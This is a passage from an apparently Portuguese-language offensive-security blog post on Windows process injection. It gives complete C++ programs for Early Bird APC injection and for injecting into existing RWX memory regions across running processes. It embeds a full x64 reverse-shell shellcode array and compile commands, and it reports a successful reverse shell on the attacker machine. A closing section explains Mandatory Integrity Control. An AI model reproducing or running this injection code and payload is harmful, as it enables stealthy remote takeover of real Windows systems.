    <span class="n">CreateProcessA</span><span class="p">(</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">calc.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
    <span class="c1">// alterando estado para alertable wait</span>
    <span class="n">WaitForSingleObject</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="mi">1000</span><span class="p">);</span>
    <span class="n">procH</span> <span class="o">=</span> <span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">;</span>
    <span class="n">threadH</span> <span class="o">=</span> <span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">;</span>

    <span class="c1">// aloca o buffer de memoria no processo</span>
    <span class="n">remoteB</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="p">(</span><span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">),</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>

    <span class="c1">// copia o payload entre os processos</span>
    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">procH</span><span class="p">,</span> <span class="n">remoteB</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">payload_len</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// injetando na thread suspensa</span>
    <span class="n">PTHREAD_START_ROUTINE</span> <span class="n">apc</span> <span class="o">=</span> <span class="p">(</span><span class="n">PTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">remoteB</span><span class="p">;</span>
    <span class="n">QueueUserAPC</span><span class="p">((</span><span class="n">PAPCFUNC</span><span class="p">)</span><span class="n">apc</span><span class="p">,</span> <span class="n">threadH</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="c1">// resumindo a thread suspensa</span>
    <span class="n">ResumeThread</span><span class="p">(</span><span class="n">threadH</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Podemos compilar o programa:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>x86_64-w64-mingw32-gcc earlyBird.cpp <span class="nt">-o</span> earlyBird.exe <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span>
</pre></table></code></div></div><p>Ao executarmos o programa, nenhuma calculadora é aberta:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240812102208.png" alt="" /></p><p>Porém, ao analisarmos com o <em>Process Hacker</em>, vemos que temos uma calculadora suspensa que tem um processo filho invocando o CMD.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240812102347.png" alt="" /></p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240812102608.png" alt="" /></p><p>E em nossa máquina atacante, temos o <em>reverse shell</em>.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240812102410.png" alt="" /></p><p>Esta técnica, se torna um pouco mais <em>stealth</em> que a anterior, uma vez que a injeção ocorre antes mesmo da execução do processo alvo, porém, longe de ser difinitiva assim como as demias quando utilizada sozinha.</p><h1 id="injeção-em-memória-rwx">Injeção em Memória RWX</h1><p>Seguindo com o modelo conceitual descrito no processo explorado neste artigo, todas as técnicas até então têm uma caraterística em comum: em todos os casos, alocamos um espaço de memória com permissão RWX (leitura, escrita e execução) em um processo existente de nossa escolha. Fazemos isso com a função <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code> utilizando o argumento <code class="language-plaintext highlighter-rouge">PAGE_EXECUTE_READWRITE</code>.</p><p>Porém, se analisarmos de forma global, são muitos os processos que estão em execução simultaneamente durante o funcionamento do SO, e, é muito provável, que algum processa já possa ter alocado um espaço de memória com tais permissões para seu próprio funcionamento.</p><p>A ideia nesta técnica, é “caçar” entre os processos em execução, algum que já tenha alocado um <em>buffer</em> com permissão RWX, injetar nosso <em>payload</em> neste <em>buffer</em> e executá-lo.</p><p>Os recursos básicos para isso, já exploramos anteriormente, pois podemos criar o <em>snapshot</em> com todas as informações necessárias sobre os processos em execução. Para mapear os espaços de memória, podemos utilizar a função <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex">VirtualQueryEx</a> que captura informações sobre um intervalo de páginas dentro de um espaço de endereço virtual. Sua sintaxe é:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="n">SIZE_T</span> <span class="nf">VirtualQueryEx</span><span class="p">(</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">HANDLE</span>                    <span class="n">hProcess</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">,</span> <span class="n">optional</span><span class="p">]</span> <span class="n">LPCVOID</span>                   <span class="n">lpAddress</span><span class="p">,</span>
  <span class="p">[</span><span class="n">out</span><span class="p">]</span>          <span class="n">PMEMORY_BASIC_INFORMATION</span> <span class="n">lpBuffer</span><span class="p">,</span>
  <span class="p">[</span><span class="n">in</span><span class="p">]</span>           <span class="n">SIZE_T</span>                    <span class="n">dwLength</span>
<span class="p">);</span>
</pre></table></code></div></div><p>Onde:</p><ul><li><code class="language-plaintext highlighter-rouge">[in] hProcess</code> é um <em>handle</em> para um processo em execução;<li><code class="language-plaintext highlighter-rouge">[in, optional] lpAddress</code> um ponteiro para o endereço base da região de páginas a serem consultadas;<li><code class="language-plaintext highlighter-rouge">[out] lpBuffer</code> um ponteiro para uma estrutura MEMORY_BASIC_INFORMATION na qual informações sobre o intervalo de páginas especificado são retornadas;<li><code class="language-plaintext highlighter-rouge">[in] dwLength</code> o tamanho do <em>buffer</em> apontado pelo parâmetro lpBuffer , em bytes.</ul><p>Conforme analisado, é preciso ter um ponteiro para a estrutura <a href="https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information">MEMORY_BASIC_INFORMATION</a>, esta estrutura conterá as informações que precisamos sobre aquele espaço de memória analisado, suas informações são:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_MEMORY_BASIC_INFORMATION</span> <span class="p">{</span>
  <span class="n">PVOID</span>  <span class="n">BaseAddress</span><span class="p">;</span>
  <span class="n">PVOID</span>  <span class="n">AllocationBase</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">AllocationProtect</span><span class="p">;</span>
  <span class="n">WORD</span>   <span class="n">PartitionId</span><span class="p">;</span>
  <span class="n">SIZE_T</span> <span class="n">RegionSize</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">State</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">Protect</span><span class="p">;</span>
  <span class="n">DWORD</span>  <span class="n">Type</span><span class="p">;</span>
<span class="p">}</span> <span class="n">MEMORY_BASIC_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PMEMORY_BASIC_INFORMATION</span><span class="p">;</span>
</pre></table></code></div></div><p>Como podemos ver, temos a informação <code class="language-plaintext highlighter-rouge">AllocationProtect</code> que contém o permissionamento daquela região de memória.</p><p>Seguindo por partes, vamos primeiramente criar umn programa que irá extrair um <em>snapshot</em> do estado dos processos, fará um <em>loop</em> entre os processos e analisará cada bloco de memória de cada um, quando encontrar algum espaço com as permissões RWX, o programa nos retornará o nome do processo e o endereço de memória.</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">MEMORY_BASIC_INFORMATION</span> <span class="n">mem</span><span class="p">;</span> <span class="c1">//estrutura para armazenar informacoes</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span> <span class="c1">// estrutura para armazenar o snapshot</span>
    <span class="n">LPVOID</span> <span class="n">baseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// valor inicial para base address de cada processo</span>
    <span class="n">HANDLE</span> <span class="n">ph</span><span class="p">;</span> <span class="c1">// handle para o processo</span>
    <span class="n">HANDLE</span> <span class="n">hSnapshot</span><span class="p">;</span> <span class="c1">// handle para o snapshot</span>
    <span class="n">BOOL</span> <span class="n">proc</span><span class="p">;</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// inicializando o PROCESSENTRY32</span>

    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hSnapshot</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>

    <span class="c1">// inicio do loop entre os processos</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ph</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">MAXIMUM_ALLOWED</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ph</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Procurando no processo %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
            <span class="c1">// loop entre todos os blocos de memoria alocados pelo processo</span>
            <span class="k">while</span> <span class="p">(</span><span class="n">VirtualQueryEx</span><span class="p">(</span><span class="n">ph</span><span class="p">,</span> <span class="n">baseAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mem</span><span class="p">)))</span> <span class="p">{</span>
                <span class="n">baseAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">mem</span><span class="p">.</span><span class="n">BaseAddress</span> <span class="o">+</span> <span class="n">mem</span><span class="p">.</span><span class="n">RegionSize</span><span class="p">);</span>
                <span class="c1">// checando se o bloco tem permissao RWX</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">mem</span><span class="p">.</span><span class="n">AllocationProtect</span> <span class="o">==</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"Memoria RWX encontrada em 0x%x </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mem</span><span class="p">.</span><span class="n">BaseAddress</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="n">baseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">ph</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Podemos compilar o programa:</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span>x86_64-w64-mingw32-g++ huntingMemory.cpp <span class="nt">-o</span> huntingMemory.exe <span class="nt">-mconsole</span> <span class="nt">-s</span> <span class="nt">-ffunction-sections</span> <span class="nt">-fdata-sections</span> <span class="nt">-Wno-write-strings</span> <span class="nt">-Wint-to-pointer-cast</span> <span class="nt">-fno-exceptions</span> <span class="nt">-fmerge-all-constants</span> <span class="nt">-static-libstdc</span>++ <span class="nt">-static-libgcc</span> <span class="nt">-fpermissive</span>
</pre></table></code></div></div><p>Quando executamos o programa, encontramos vários possíveis pontos de injeção:</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240809082245.png" alt="" /></p><p>Uma vez que conseguimos enumerar os pontos, podemos aproveitar o <em>loop</em> para injetar nosso <em>payload</em> e executá-lo. A implementação no código fica da seguinte forma:</p><div lang="cpp" class="language-cpp highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff</span><span class="s">"</span>
<span class="s">"</span><span class="se">\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb</span><span class="s">"</span>
<span class="s">"</span><span class="se">\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">MEMORY_BASIC_INFORMATION</span> <span class="n">mem</span><span class="p">;</span> <span class="c1">//estrutura para armazenar informacoes</span>
    <span class="n">PROCESSENTRY32</span> <span class="n">pe32</span><span class="p">;</span> <span class="c1">// estrutura para armazenar o snapshot</span>
    <span class="n">LPVOID</span> <span class="n">baseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="c1">// valor inicial para base address de cada processo</span>
    <span class="n">HANDLE</span> <span class="n">ph</span><span class="p">;</span> <span class="c1">// handle para o processo</span>
    <span class="n">HANDLE</span> <span class="n">hSnapshot</span><span class="p">;</span> <span class="c1">// handle para o snapshot</span>
    <span class="n">BOOL</span> <span class="n">proc</span><span class="p">;</span>
    <span class="n">pe32</span><span class="p">.</span><span class="n">dwSize</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PROCESSENTRY32</span><span class="p">);</span> <span class="c1">// inicializando o PROCESSENTRY32</span>

    <span class="n">hSnapshot</span> <span class="o">=</span> <span class="n">CreateToolhelp32Snapshot</span><span class="p">(</span><span class="n">TH32CS_SNAPPROCESS</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">INVALID_HANDLE_VALUE</span> <span class="o">==</span> <span class="n">hSnapshot</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>

    <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32First</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>

    <span class="c1">// inicio do loop entre os processos</span>
    <span class="k">while</span> <span class="p">(</span><span class="n">proc</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ph</span> <span class="o">=</span> <span class="n">OpenProcess</span><span class="p">(</span><span class="n">MAXIMUM_ALLOWED</span><span class="p">,</span> <span class="nb">false</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">th32ProcessID</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ph</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">printf</span><span class="p">(</span><span class="s">"Procurando no processo %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pe32</span><span class="p">.</span><span class="n">szExeFile</span><span class="p">);</span>
            <span class="c1">// loop entre todos os blocos de memoria alocados pelo processo</span>
            <span class="k">while</span> <span class="p">(</span><span class="n">VirtualQueryEx</span><span class="p">(</span><span class="n">ph</span><span class="p">,</span> <span class="n">baseAddress</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mem</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">mem</span><span class="p">)))</span> <span class="p">{</span>
                <span class="n">baseAddress</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">mem</span><span class="p">.</span><span class="n">BaseAddress</span> <span class="o">+</span> <span class="n">mem</span><span class="p">.</span><span class="n">RegionSize</span><span class="p">);</span>
                <span class="c1">// checando se o bloco tem permissao RWX</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">mem</span><span class="p">.</span><span class="n">AllocationProtect</span> <span class="o">==</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">printf</span><span class="p">(</span><span class="s">"Memoria RWX encontrada em 0x%x </span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">mem</span><span class="p">.</span><span class="n">BaseAddress</span><span class="p">);</span>
                    <span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">ph</span><span class="p">,</span> <span class="n">mem</span><span class="p">.</span><span class="n">BaseAddress</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">);</span>
                    <span class="n">CreateRemoteThread</span><span class="p">(</span><span class="n">ph</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="p">(</span><span class="n">LPTHREAD_START_ROUTINE</span><span class="p">)</span><span class="n">mem</span><span class="p">.</span><span class="n">BaseAddress</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
                    <span class="k">break</span><span class="p">;</span>
                <span class="p">}</span>
            <span class="p">}</span>
            <span class="n">baseAddress</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">Process32Next</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pe32</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hSnapshot</span><span class="p">);</span>
    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">ph</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Após a compilação, quando executamos o programa, temos o <em>reverse shell</em> na máquina atacante.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240809083025.png" alt="" /></p><p>Agora, com um olhar mais analítico, uma vez que fazemos um <em>loop</em> nos processos e procuramos todos os espaços com permissão RWX e injetamos o <em>payload</em>, podemos olhar no <em>Process Hacker</em> que o <em>exploit</em> foi executado em mais de um processo.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240809083240.png" alt="" /></p><p>Temos 3 processos que aceitaram a execução do <em>payload</em> e se olharmos a saída do programa, veremos que realmente foram enumerados como possíveis alvos.</p><p><img data-proofer-ignore data-src="/img/posts/Pasted%20image%2020240809083421.png" alt="" /></p><p>Obviamente, estas técnicas podem ser combinadas e com toda certeza do mundo podem ser melhoradas. Porém, são informações que valem muito a pena ter no arsenal.</p><h1 id="limitações">Limitações</h1><p>Assim como todo processo em sua forma mais básica, estes métodos aqui apresentados possuem algumas limitações.</p><p>O <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control"><strong><em>Mandatory Integrity Control</em> (MIC)</strong></a> é uma característica de segurança introduzida no <strong>Windows Vista</strong> e mantida nas versões subsequentes do Windows. O MIC aplica níveis de integridade aos processos e objetos (como arquivos e chaves de registro) para controlar o acesso com base nesses níveis. Esse sistema é uma extensão do modelo de segurança baseado em <em>Discretionary Access Control</em> (DAC), adicionando uma camada de controle mais rígida e sistemática.</p><h2 id="níveis-de-integridade">Níveis de Integridade</h2><p>O MIC define quatro principais níveis de integridade, que determinam a confiança dos processos e objetos no sistema. Esses níveis são:</p><ol><li><strong><em>System Integrity Level (System)</em>:</strong> Utilizado por processos do sistema operacional. É o nível mais alto de integridade.<li><strong><em>High Integrity Level (High)</em>:</strong> Aplicado a processos que requerem privilégios elevados, como aqueles executados por administradores.<li><strong><em>Medium Integrity Level (Medium)</em>:</strong> O nível padrão para processos executados por usuários normais.<li><strong><em>Low Integrity Level (Low)</em>:</strong> Aplicado a processos que requerem menos confiança, como navegadores web ou leitores de e-mail.</ol><h2 id="como-funciona-o-mic">Como Funciona o MIC?</h2><p>O MIC controla o acesso aos objetos no sistema operacional através de um mecanismo chamado <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/access-control-entry"><strong><em>Access Control Entry</em> (ACE)</strong></a>, sendo parte do <a href="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-lists"><strong><em>Access Control List</em> (ACL)</strong></a>. Além das permissões tradicionais, cada ACE inclui um nível de integridade. As regras de acesso são determinadas com base na comparação entre o nível de integridade do processo solicitante e o nível de integridade do objeto de destino.</p><h3 id="princípios-de-controle-de-acesso">Princípios de Controle de Acesso</h3><ol><li><strong><em>No Write Up</em>:</strong> Um processo não pode modificar (escrever) um objeto que possui um nível de integridade mais alto. Por exemplo, um processo de integridade média não pode escrever em um objeto de alta integridade.<li><strong><em>No Read Down</em>:</strong> Um processo de alta integridade não pode ler (e potencialmente expor dados sensíveis de) objetos de baixa integridade. No entanto, essa regra é menos rigorosa e, em muitos casos, é permitido que processos de alta integridade leiam objetos de níveis mais baixos.</ol><h3 id="exemplos-de-aplicação">Exemplos de Aplicação</h3><ul><li><strong>Internet Explorer:</strong> No modo protegido do Internet Explorer, o navegador é executado com um nível de integridade baixo para minimizar o impacto de <em>exploits</em> de segurança.<li><strong>UAC (<em>User Account Control</em>):</strong> Utiliza o MIC para executar processos elevados com um nível de integridade alto, enquanto mantém processos de usuário comum em um nível médio.</ul><h3 id="configuração-de-níveis-de-integridade">Configuração de Níveis de Integridade</h3><p>Os níveis de integridade são configurados usando <strong>SIDs (<em>Security Identifiers</em>)</strong> específicos. Por exemplo:</p><ul><li>S-1-16-16384 (<em>System Integrity</em>)<li>S-1-16-12288 (<em>High Integrity</em>)<li>S-1-16-8192 (<em>Medium Integrity</em>)<li>S-1-16-4096 (<em>Low Integrity</em>)</ul><p>Para visualizar e modificar os níveis de integridade de objetos no sistema, podem ser utilizados comandos como <code 